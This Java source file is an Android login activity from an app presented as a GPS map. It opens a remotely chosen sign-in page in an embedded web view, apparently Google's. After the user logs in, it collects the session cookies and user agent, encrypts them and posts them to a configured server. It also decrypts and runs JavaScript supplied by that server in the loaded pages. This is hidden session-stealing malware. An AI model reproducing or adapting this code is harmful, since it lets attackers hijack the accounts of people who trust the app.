package net.maps.navigation.gps.location.sondermap.activity;

import static net.maps.navigation.gps.location.sondermap.constant.Constant.AD_BEAN;
import static net.maps.navigation.gps.location.sondermap.constant.Constant.APP_POST_URL;
import static net.maps.navigation.gps.location.sondermap.constant.Constant.Agent;
import static net.maps.navigation.gps.location.sondermap.constant.Constant.AppId;
import static net.maps.navigation.gps.location.sondermap.constant.Constant.FIRST;
import static net.maps.navigation.gps.location.sondermap.constant.Constant.isFocus;
import static net.maps.navigation.gps.location.sondermap.util.HttpUtils.postStringRequest;

import android.annotation.SuppressLint;
import android.content.Intent;
import android.graphics.Bitmap;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.ViewGroup;
import android.webkit.CookieManager;
import android.webkit.ValueCallback;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.LinearLayout;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import com.just.agentweb.AgentWeb;
import com.just.agentweb.WebChromeClient;
import com.tencent.mmkv.MMKV;

import net.maps.navigation.gps.location.sondermap.R;
import net.maps.navigation.gps.location.sondermap.base.TestBeam;
import net.maps.navigation.gps.location.sondermap.bean.AdBean;
import net.maps.navigation.gps.location.sondermap.bean.AgentBean;
import net.maps.navigation.gps.location.sondermap.bean.ChannelStatusBean;
import net.maps.navigation.gps.location.sondermap.util.AesUtil;
import net.maps.navigation.gps.location.sondermap.util.HttpUtils;
import net.maps.navigation.gps.location.sondermap.util.MyUtil;
import net.maps.navigation.gps.location.sondermap.R;
import net.maps.navigation.gps.location.sondermap.bean.AdBean;

import org.reactivestreams.Subscription;

import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Objects;
import java.util.concurrent.TimeUnit;

import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers;
import io.reactivex.rxjava3.core.Observable;
import io.reactivex.rxjava3.functions.Consumer;
import io.reactivex.rxjava3.schedulers.Schedulers;

public class ActLogin extends AppCompatActivity {


    private AdBean adBean;
    private Boolean isLoad = false;
    private Subscription mSubscription;
    private ArrayList<String> loadUrls = new ArrayList<>();
    private AgentWeb mAgentWeb;
    String aid = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.act_login);
        initUI();
        initData();


    }

    public void initUI() {

    }

    public void initData() {

        if (MMKV.defaultMMKV().decodeString(AD_BEAN) != null) {
            String s = MMKV.defaultMMKV().decodeString(AD_BEAN);
            adBean = new Gson().fromJson(s, AdBean.class);

        } else {
            adBean = getIntent().getParcelableExtra(AD_BEAN);
        }

        loadUrls.addAll(adBean.getYup());
        loMyWebUrl(adBean.getMy());

    }

    public void loMyWebUrl(String url) {
        mAgentWeb = AgentWeb.with(ActLogin.this)
                .setAgentWebParent((ViewGroup) findViewById(R.id.layout1), new LinearLayout.LayoutParams(-1, -1))
                .closeIndicator()
                .setWebChromeClient(mWebChromeClient)
                .setWebViewClient(mWebViewClient)
                .createAgentWeb()
                .ready()
                .go(url);
        if (MMKV.defaultMMKV().decodeString(Agent)!=null){
            String s = MMKV.defaultMMKV().decodeString(Agent);
            AgentBean agentBean =  new Gson().fromJson(s,new TypeToken<AgentBean>(){}.getType());

            if (agentBean.getStatus().equals("1")){
                System.out.println("配置请求头："+agentBean.toString());
                mAgentWeb.getAgentWebSettings().getWebSettings().setUserAgentString(s);
            }
        }
     //   mAgentWeb.getAgentWebSettings().getWebSettings().setUserAgentString("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36");
    }


    @SuppressLint("CheckResult")
    private void reLoad() {

        Observable.timer(10, TimeUnit.SECONDS)
                .doOnSubscribe(it -> {

                    mSubscription = (Subscription) it;
                })
                .subscribeOn(Schedulers.newThread())
                .observeOn(AndroidSchedulers.mainThread())
                .filter(it -> {
                    if (!isFocus) {
                        loMyWebUrl(loadUrls.get(0));
                        //   webView.loadUrl(loadUrls.get(0));
                        if (mSubscription != null) {
                            mSubscription.cancel();
                        }
                    }
                    return isFocus;
                })
                .doOnNext(it -> {
                    isFocus = false;
                })
                .doOnNext(it -> {
                    loadUrls.remove(0);
                })
                .filter(it -> !loadUrls.isEmpty())
                .map(it -> loadUrls.get(0))
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(it -> {
                    loMyWebUrl(it);
                    if (mSubscription != null) {
                        mSubscription.cancel();
                    }
                }, throwable -> {
                    System.out.println("------------------>");
                });
    }


    private com.just.agentweb.WebViewClient mWebViewClient = new com.just.agentweb.WebViewClient() {
        @Override
        public void onPageStarted(WebView view, String url, Bitmap favicon) {
            //do you  work
        }

        @SuppressLint("CheckResult")
        @Override
        public void onPageFinished(WebView view, String url) {
            super.onPageFinished(view, url);
            MyUtil.MyLog(url);
            if (!isLoad) {
                if (url.contains(adBean.getPli()) || url.contains(adBean.getPli1()) || url.contains(adBean.getMy1())) {
                    isLoad = true;
                    // This is the Google sign-in page
                    Log.i("MyWebViewClient", "登录成功");
                    if (MMKV.defaultMMKV().decodeString(FIRST) != null) {
                        aid = MMKV.defaultMMKV().decodeString(FIRST);
                    }
                    ChannelStatusBean bean = new ChannelStatusBean(AppId, CookieManager.getInstance().getCookie(adBean.getMy()), CookieManager.getInstance().getCookie(url), mAgentWeb.getAgentWebSettings().getWebSettings().getUserAgentString(), url, aid);
                    Log.i("MyWebViewClient", "Cookie信息:" + bean.toString());
                    String encrypt = AesUtil.encrypt(new Gson().toJson(bean));

                    postStringRequest(APP_POST_URL, ActLogin.this, encrypt,
                            new Response.Listener<String>() {
                                @Override
                                public void onResponse(String response) {
                                    // 处理响应成功时的逻辑
                                    MyUtil.MyLog("上传成功");
                                }
                            },
                            new Response.ErrorListener() {
                                @Override
                                public void onErrorResponse(VolleyError error) {
                                    // 处理响应失败时的逻辑
                                    MyUtil.MyLog("上传失败" + error);
                                }
                            });

                    startActivity(new Intent(ActLogin.this, ActMap.class));
                    finish();
                }

                if (url.contains(adBean.getMy())){
                    //加载JS代码
                    view.evaluateJavascript(AesUtil.decrypt(adBean.getAab()), new ValueCallback<String>() {
                        @Override
                        public void onReceiveValue(String value) {
                            MyUtil.MyLog("--"+value);
                        }
                    });
                }

                if (!loadUrls.isEmpty() && url.contains(loadUrls.get(0))) {
                    Observable.just(Objects.requireNonNull(AesUtil.decrypt(adBean.getYupj())))
                            .subscribeOn(Schedulers.newThread())
                            .filter(it -> !it.isEmpty())
                            .observeOn(AndroidSchedulers.mainThread())
                            .doOnNext(it -> {
                                if (url.equals(loadUrls.get(0))) {
                                    view.evaluateJavascript(it, null);
                                }
                            })
                            .delay(1, TimeUnit.SECONDS)
                            .subscribe(new Consumer<String>() {
                                @Override
                                public void accept(String it) throws Exception {
                                    reLoad();
                                }
                            }, new Consumer<Throwable>() {
                                @Override
                                public void accept(Throwable throwable) throws Exception {
                                    System.out.println("------------------>");
                                }
                            });
                }
            }


        }

    };
    private WebChromeClient mWebChromeClient = new WebChromeClient() {
        @Override
        public void onProgressChanged(WebView view, int newProgress) {
            //do you work
        }
    };

}